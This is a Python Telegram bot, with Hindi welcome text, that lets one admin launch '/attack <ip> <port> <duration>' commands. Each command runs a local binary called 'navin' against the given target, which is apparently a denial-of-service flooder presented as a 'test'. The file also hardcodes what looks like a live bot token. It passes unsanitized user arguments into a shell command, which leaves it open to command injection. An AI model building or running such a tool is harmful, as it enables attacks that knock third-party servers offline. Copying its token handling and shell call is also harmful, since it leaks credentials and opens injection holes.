import os
import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7915616861:AAFeJRMLOcaRJXTvyye0acLqv1sK54gNMLI'  # Replace with your bot token
ALLOWED_ADMIN_ID = 1213841794  # Replace with your Telegram ID

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", 
    level=logging.INFO
)

async def start(update: Update, context: CallbackContext):
    """ Sends a stylish welcome message with buttons """
    chat_id = update.effective_chat.id
    message = (
        " *SWAGAT HAI APKA HAMARE BOT MEIN*\n\n"
        " *Commands:*\n"
        "🔹 `/attack <ip> <port> <duration>` - Start a test\n"
        "🔹 `/status` - Check attack progress\n"
        "🔹 `/stop` - Stop an active test\n"
    )

    keyboard = [[InlineKeyboardButton("ℹ️ Help", callback_data="help")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown", reply_markup=reply_markup)

async def run_attack(chat_id, ip, port, duration, context):
    """ Executes the navin binary asynchronously with logging """
    try:
        logging.info(f"Starting attack on {ip}:{port} for {duration}s")
        process = await asyncio.create_subprocess_shell(
            f"./navin {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            await context.bot.send_message(chat_id=chat_id, text=f"✅ *Output:*\n```\n{stdout.decode()}\n```", parse_mode="Markdown")
        if stderr:
            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *Error:*\n```\n{stderr.decode()}\n```", parse_mode="Markdown")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ *Error:* {str(e)}", parse_mode="Markdown")

async def attack(update: Update, context: CallbackContext):
    """ Handles attack commands with validation """
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_ADMIN_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Unauthorized Access!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Usage:* `/attack <ip> <port> <duration>`", parse_mode="Markdown")
        return

    ip, port, duration = args

    await context.bot.send_message(chat_id=chat_id, text=f"⚔️ *Starting test on* `{ip}:{port}` *for* `{duration}s`...", parse_mode="Markdown")
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def status(update: Update, context: CallbackContext):
    """ Placeholder for checking attack status """
    chat_id = update.effective_chat.id
    await context.bot.send_message(chat_id=chat_id, text="📊 *Status:* No active tests.", parse_mode="Markdown")

def main():
    """ Starts the Telegram bot """
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("status", status))
    application.run_polling()

if __name__ == '__main__':
    main()
